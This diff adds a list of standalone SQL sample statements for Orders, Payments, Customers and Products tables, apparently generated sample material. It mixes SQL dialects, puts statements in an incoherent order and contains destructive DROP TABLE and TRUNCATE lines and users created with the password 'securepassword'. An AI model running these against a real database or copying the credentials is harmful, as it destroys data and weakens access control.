+INSERT INTO Orders (OrderID, CustomerID, OrderDate, Status) VALUES (1, 1, '2023-01-01', 'Pending');
+UPDATE Orders SET Status = 'Shipped' WHERE OrderID = 1;
+DELETE FROM Orders WHERE OrderID = 1;
+CREATE INDEX idx_order_date ON Orders(OrderDate);
+DROP TABLE Orders;
+ALTER TABLE Orders ADD COLUMN ShippingDate DATE;
+ALTER TABLE Orders DROP COLUMN ShippingDate;
+CREATE VIEW PendingOrders AS SELECT OrderID, CustomerID, OrderDate FROM Orders WHERE Status = 'Pending';
+RENAME TABLE Orders TO OrderDetails;
+TRUNCATE TABLE Orders;
+GRANT SELECT, INSERT, UPDATE ON Orders TO user10;
+REVOKE DELETE ON Orders FROM user10;
+CREATE USER 'order_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'order_manager' RENAME TO 'om_user';
+BEGIN TRANSACTION; INSERT INTO Orders (OrderID, CustomerID, OrderDate, Status) VALUES (2, 2, '2023-02-01', 'Pending'); COMMIT;
+LOCK TABLES Orders WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE OrderDB TO 'order_backup.sql';
+CALL UpdateOrderStatus();
+SET @total_orders = (SELECT COUNT(*) FROM Orders);
+DECLARE @average_order_value DECIMAL(10, 2);
+SET @average_order_value = (SELECT AVG(TotalValue) FROM Orders);
+IF @average_order_value > 500 THEN UPDATE Orders SET Priority = 'High' WHERE TotalValue > 500; END IF;
+CREATE TABLE Payments (PaymentID INT PRIMARY KEY, OrderID INT, Amount DECIMAL(10, 2), PaymentDate DATE);
+INSERT INTO Payments (PaymentID, OrderID, Amount, PaymentDate) VALUES (1, 1, 100.00, '2023-01-01');
+UPDATE Payments SET Amount = 150.00 WHERE PaymentID = 1;
+DELETE FROM Payments WHERE PaymentID = 1;
+CREATE INDEX idx_payment_date ON Payments(PaymentDate);
+DROP TABLE Payments;
+ALTER TABLE Payments ADD COLUMN PaymentMethod VARCHAR(50);
+ALTER TABLE Payments DROP COLUMN PaymentMethod;
+CREATE VIEW RecentPayments AS SELECT PaymentID, OrderID, Amount FROM Payments WHERE PaymentDate > '2023-01-01';
+RENAME TABLE Payments TO PaymentDetails;
+TRUNCATE TABLE Payments;
+GRANT SELECT, INSERT, UPDATE ON Payments TO user11;
+REVOKE DELETE ON Payments FROM user11;
+CREATE USER 'payment_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'payment_manager' RENAME TO 'pm_user';
+BEGIN TRANSACTION; INSERT INTO Payments (PaymentID, OrderID, Amount, PaymentDate) VALUES (2, 2, 200.00, '2023-02-01'); COMMIT;
+LOCK TABLES Payments WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE PaymentDB TO 'payment_backup.sql';
+CALL UpdatePaymentStatus();
+SET @total_payments = (SELECT COUNT(*) FROM Payments);
+DECLARE @average_payment_amount DECIMAL(10, 2);
+SET @average_payment_amount = (SELECT AVG(Amount) FROM Payments);
+IF @average_payment_amount > 100 THEN UPDATE Payments SET HighValue = 1 WHERE Amount > 100; END IF;
+CREATE TABLE Customers (CustomerID INT PRIMARY KEY, CustomerName VARCHAR(100), ContactName VARCHAR(100), Country VARCHAR(50));
+INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (1, 'Alfreds Futterkiste', 'Maria Anders', 'Germany');
+UPDATE Customers SET ContactName = 'Maria Schmidt' WHERE CustomerID = 1;
+DELETE FROM Customers WHERE CustomerID = 1;
+CREATE INDEX idx_customer_name ON Customers(CustomerName);
+DROP TABLE Customers;
+ALTER TABLE Customers ADD COLUMN Phone VARCHAR(20);
+ALTER TABLE Customers DROP COLUMN Phone;
+CREATE VIEW ActiveCustomers AS SELECT CustomerID, CustomerName FROM Customers WHERE Country = 'Germany';
+RENAME TABLE Customers TO CustomerDetails;
+TRUNCATE TABLE Customers;
+GRANT SELECT, INSERT, UPDATE ON Customers TO user12;
+REVOKE DELETE ON Customers FROM user12;
+CREATE USER 'customer_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'customer_manager' RENAME TO 'cm_user';
+BEGIN TRANSACTION; INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (2, 'Ana Trujillo Emparedados y helados', 'Ana Trujillo', 'Mexico'); COMMIT;
+LOCK TABLES Customers WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE CustomerDB TO 'customer_backup.sql';
+CALL UpdateCustomerStatus();
+SET @total_customers = (SELECT COUNT(*) FROM Customers);
+DECLARE @average_customer_orders INT;
+SET @average_customer_orders = (SELECT AVG(OrderCount) FROM CustomerStats);
+IF @average_customer_orders > 10 THEN UPDATE Customers SET VIP = 1 WHERE OrderCount > 10; END IF;
+CREATE TABLE Products (ProductID INT PRIMARY KEY, ProductName VARCHAR(100), SupplierID INT, CategoryID INT, UnitPrice DECIMAL(10, 2), UnitsInStock INT);
+INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (1, 'Chai', 1, 1, 18.00, 39);
+UPDATE Products SET UnitPrice = 19.00 WHERE ProductID = 1;
+DELETE FROM Products WHERE ProductID = 1;
+CREATE INDEX idx_product_name ON Products(ProductName);
+DROP TABLE Products;
+ALTER TABLE Products ADD COLUMN Discontinued BIT;
+ALTER TABLE Products DROP COLUMN Discontinued;
+CREATE VIEW ActiveProducts AS SELECT ProductID, ProductName FROM Products WHERE Discontinued = 0;
+RENAME TABLE Products TO ProductDetails;
+TRUNCATE TABLE Products;
+GRANT SELECT, INSERT, UPDATE ON Products TO user13;
+REVOKE DELETE ON Products FROM user13;
+CREATE USER 'product_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'product_manager' RENAME TO 'pm_user';
+BEGIN TRANSACTION; INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (2, 'Chang', 1, 1, 19.00, 17); COMMIT;
